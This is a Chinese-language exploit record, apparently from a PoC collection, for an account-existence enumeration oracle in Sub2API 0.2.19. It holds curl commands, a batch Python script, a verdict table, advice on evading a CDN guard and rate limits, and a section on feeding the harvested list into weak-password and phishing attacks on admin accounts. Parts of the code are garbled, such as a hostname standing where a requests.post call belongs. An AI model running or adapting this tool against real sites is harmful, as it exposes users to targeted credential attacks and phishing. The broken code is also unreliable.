# sub2api 邮箱验证码接口账号存在性枚举 oracle（公开 /api/v1/auth/send-verify-code 409/200 直读，注册侧 409/500）

- **code**: sub2api-邮箱验证码接口账号存在性枚举-oracle-公开-api-v1-auth-send-verify-co
- **kind**: script
- **category**: info-leak
- **component**: Sub2API (Wei-Shaw/sub2api)
- **versions**: 0.2.19（源码 backend/internal/service/auth_service.go:334 existsByEmailOrAlias → ErrEmailExists）
- **severity**: low
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: task#607 主机 i6604，2026-10-31 10:37-10:45 +08，target483.example.com（sub2api 0.2.19），Chrome UA、不带 XFF、3s 间隔：① 全未授权公开端点 POST /api/v1/auth/send-verify-code {"email":"<已注册账号>"} → HTTP 409 69B {"code":409,"message":"email already exists","reason":"EMAIL_EXISTS"}；{"email":"user@example.com"} → HTTP 200 102B {"code":0,"message":"success","data":{"message":"Verification code sent successfully","countdown":60}}。② 登录态侧 POST /api/v1/user/account-bindings/email/send-code：user@example.com / user@example.com / user@example.com / user@example.com 均 409 EMAIL_EXISTS；未占用地址 500 39B {"code":500,"message":"internal error"}（该实例 SMTP 发送失败）。③ 判读对照由已知账号自助注册邮箱复核，同一地址两路结论一致；产物 D:\ARTEX\data\tasks\607\i6604\p1.out~p3.out。
- **path**: pocs/sub2api-邮箱验证码接口账号存在性枚举-oracle-公开-api-v1-auth-send-verify-co/sub2api_email_enum_oracle.py
- **created_at**: 2026-10-31T02:49:02.176Z
- **engine**: https://target483.example.com

## 描述

Sub2API 的邮箱验证码发送接口在"先查重后发信"的流程里把存在性直接写进状态码：公开端点 POST /api/v1/auth/send-verify-code 对已注册邮箱返回 409 EMAIL_EXISTS、对未注册邮箱返回 200 success（零凭据、零副作用、对已存在地址不发信）；登录态端点 POST /api/v1/user/account-bindings/email/send-code 对他人已占用邮箱返回 409、其他地址返回 500（SMTP 失败时）或 200。攻击者可批量判定任意邮箱是否在本站注册（含 admin@<域> 等管理账号），产出定向爆破/钓鱼的目标清单。只泄露存在性，不含账号内数据。

## 用法

```
python sub2api_email_enum_oracle.py <base_url> emails.txt [--token <user_jwt>]

前置：目标为 Sub2API/New-API 系（GET /api/v1/auth/me、/api/v1/setup 可指纹；前端 bundle 含 sub2api）。必须带浏览器 UA（Chrome/131 之类），**不要**带 X-Forwarded-For（会触发 CDN _guard 456）。默认端点无需任何凭据；注册侧端点需任意普通用户 JWT（--token 可选，只有在公开端点被封时才有价值）。

判据（严格）：
  public 端点  409 + reason=EMAIL_EXISTS → 存在；200 + code=0 → 不存在
  bind 端点    409 → 存在；非 409（200/500）→ 不存在
先拿 1 个已知属性地址做对照：若未注册地址同样返回 409，则判据不成立（实例已改逻辑或中间层统一改写状态码），立即停手。

速率：限速按真实出口 IP 计约 20 次/分，取 3s/请求；触发 429 就翻倍间隔。邮箱规范化细节：大小写不敏感（大写成仍 409）；admin+tag@域 也被判存在；带尾随空格 → 400 校验失败；带尾随点 → 400 INVALID_EMAIL。

脚本默认只读、不落任何数据（公开端点对已存在地址直接 409 不发信），适合大字典；判断结果写 stdout，可重定向成清单喂给弱口令/钓鱼环节。
```

## 正文

```
# sub2api 邮箱存在性枚举 oracle

来源：target483.example.com（sub2api 0.2.19）。原理：`POST /api/v1/auth/send-verify-code`
（注册用，**未授权**）在发信前调用 `existsByEmailOrAlias`
（backend/internal/service/auth_service.go:334），命中即返回 `ErrEmailExists`
→ HTTP 409 `{"code":409,"message":"email already exists","reason":"EMAIL_EXISTS"}`；
未命中才真正发信 → HTTP 200 `{"code":0,"message":"success","data":{...,"countdown":60}}`。

登录态侧同类 oracle：`POST /api/v1/user/account-bindings/email/send-code`
对已被他人占用的邮箱返回 409 EMAIL_EXISTS，对可用地址走发信（SMTP 未配置时 500
`{"code":500,"message":"internal error"}`）。body 里的 `user_id` 被忽略（非 IDOR）。

## 1. 最小手工复现

```bash
UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/192.0.2.4 Safari/537.36'
# 已知存在的账号 → 期望 409
curl -s -o /dev/null -w '%{http_code}\n' -A "$UA" \
  -H 'Content-Type: application/json' -H 'Accept: application/json' \
  -X POST https://TARGET/api/v1/auth/send-verify-code \
  -d '{"email":"admin@TARGET_DOMAIN"}'
# 随机未注册 → 期望 200
curl -s -o /dev/null -w '%{http_code}\n' -A "$UA" \
  -H 'Content-Type: application/json' -H 'Accept: application/json' \
  -X POST https://TARGET/api/v1/auth/send-verify-code \
  -d '{"email":"user@example.com"}'
```

两次结果不等（409 vs 200）即 oracle 成立。每次间隔 ≥3s。

## 2. 批量脚本

```python
#!/usr/bin/env python3
"""sub2api 邮箱存在性枚举 oracle
用法: python sub2api_email_enum_oracle.py https://target emails.txt [--token JWT] [--rate 3.0]
"""
import argparse, json, sys, time
import urllib3, requests

urllib3.disable_warnings()
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/192.0.2.4 Safari/537.36")
H = {"User-Agent": UA, "Content-Type": "application/json", "Accept": "application/json"}


def post(base, path, email, token=None, timeout=25):
    h = dict(H)
    if token:
        h["Authorization"] = "Bearer " + token
    r = target9.example.com(base.rstrip("/") + path, headers=h,
                      json={"email": email}, timeout=timeout, verify=False)
    return r.status_code, r.text[:300]


def probe(base, email, token, rate):
    """返回 True=存在 / False=不存在 / None=不确定"""
    st, body = post(base, "/api/v1/auth/send-verify-code", email)   # 无凭据优先
    if st == 409 and "EMAIL_EXISTS" in body:
        return True
    if st == 200:
        return False
    if st == 429:
        time.sleep(rate * 4)
        st, body = post(base, "/api/v1/auth/send-verify-code", email)
        if st == 409 and "EMAIL_EXISTS" in body:
            return True
        if st == 200:
            return False
    if token:                                                        # 公开端点被封时退到登录侧
        st, body = post(base, "/api/v1/user/account-bindings/email/send-code", email, token)
        if st == 409 and "EMAIL_EXISTS" in body:
            return True
        # 200/500 均视为未占用（500 = 该实例 SMTP 发信失败）
    return None


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("base")
    ap.add_argument("list")
    ap.add_argument("--token", default=None)
    ap.add_argument("--rate", type=float, default=3.0)
    a = ap.parse_args()
    for line in open(a.list, encoding="utf-8"):
        e = line.strip()
        if not e or e.startswith("#"):
            continue
        try:
            res = probe(a.base, e, a.token, a.rate)
        except Exception as ex:
            print(f"ERR\t{e}\t{ex}", flush=True)
            time.sleep(a.rate)
            continue
        print(("EXISTS" if res else "FREE" if res is False else "UNKNOWN") + "\t" + e, flush=True)
        time.sleep(a.rate)


if __name__ == "__main__":
    main()
```

## 3. 判定表

| 端点 | 状态码 / reason | 结论 |
|---|---|---|
| /api/v1/auth/send-verify-code（无需凭据） | 409 + EMAIL_EXISTS | 已注册 |
| 同上 | 200 + code:0 | 未注册 |
| /api/v1/user/account-bindings/email/send-code（需 Bearer） | 409 + EMAIL_EXISTS | 已注册 |
| 同上 | 500 internal error（SMTP 坏）或 200 | 未注册 |
| 任一端点 | 400 + INVALID_EMAIL / 校验 failed | 输入格式问题，重试 |

邮箱规范化：大小写不敏感；`admin+任意tag@域` 也判存在（别拿来当新地址）；
带尾随空格 → 400 Field validation；带尾随点 → 400 INVALID_EMAIL。

## 4. 失败/误判排查

- 未注册地址也 409 → 判据失效（版本变化或前面有 WAF 统一改码），用两次对照确认后停。
- 全部 403/456 → 没带浏览器 UA 或带了 X-Forwarded-For；补 UA、去掉 XFF。
- 全部 429 → 真实出口 IP 限速约 20 次/分；间隔加到 6~10s，或换出口。
- 公开端点 404 → 版本较老/路由不同，改用登录侧端点（需要任意用户 JWT）。
- 200 但 data.countdown 缺失 → 可能只回 success 不真发信，仍按"未注册"处理即可，
  但务必先跑已知存在地址的对照发。

## 5. 打完的用法

得到 exists 清单后：管理账号猜测（admin@/root@/ops@<域>）→ 定向弱口令或钓鱼；
对确认存在的地址做注册流程拔取用户名/重置口令探测。

## 6. 实机回显（target483.example.com，2026-10-31）

```
POST /api/v1/auth/send-verify-code {"email":"user@example.com"}
  → 200 {"code":0,"message":"success","data":{"message":"Verification code sent successfully","countdown":60}}
POST /api/v1/user/account-bindings/email/send-code {"email":"user@example.com"}
  → 409 {"code":409,"message":"email already exists","reason":"EMAIL_EXISTS"}
POST 同上 {"email":"user@example.com"} / {"email":"user@example.com"} → 均 409 EMAIL_EXISTS
POST 同上 {"email":"user@example.com","user_id":1} → 500 internal error
```

```
